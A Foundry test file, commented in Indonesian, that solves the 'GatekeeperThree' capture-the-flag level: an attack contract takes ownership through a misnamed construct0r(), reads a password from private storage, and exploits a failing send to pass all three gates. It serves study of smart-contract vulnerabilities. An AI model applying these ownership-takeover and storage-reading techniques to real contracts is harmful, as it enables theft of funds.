// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {GatekeeperThree} from "src/levels/GatekeeperThree.sol";
import {GatekeeperThreeFactory} from "src/levels/GatekeeperThreeFactory.sol";

// Kontrak ini SENGAJA tanpa receive()/fallback(): gateThree mensyaratkan
// send(0.001 ether) ke owner GAGAL. Ia menjadi owner lewat construct0r().
contract GatekeeperThreeAttack {
    GatekeeperThree public target;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function becomeOwner() external {
        target.construct0r();
    }

    function enterGate() external {
        target.enter();
    }
}

contract GatekeeperThreeSolve is Test {
    GatekeeperThreeFactory factory;
    GatekeeperThree instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new GatekeeperThreeFactory();
        vm.deal(player, 10 ether);
        vm.deal(address(this), 10 ether);
        instance = GatekeeperThree(payable(factory.createInstance(player)));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        GatekeeperThreeAttack attack = new GatekeeperThreeAttack(payable(address(instance)));

        // gateOne: msg.sender == owner (kontrak penyerang), tx.origin != owner.
        attack.becomeOwner();

        // gateTwo: allowEntrance via trick. Password = block.timestamp,
        // tersimpan di slot 2 SimpleTrick (target slot 0, trick slot 1).
        instance.createTrick();
        address trick = address(instance.trick());
        uint256 pw = uint256(vm.load(trick, bytes32(uint256(2))));
        instance.getAllowance(pw);

        // gateThree: balance > 0.001 ether DAN send ke owner gagal.
        payable(address(instance)).transfer(0.002 ether);

        // enter() dengan tx.origin = player (startPrank 2 argumen —
        // pelajaran fase H: prank 1 argumen tidak mengubah tx.origin).
        vm.startPrank(player, player);
        attack.enterGate();
        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
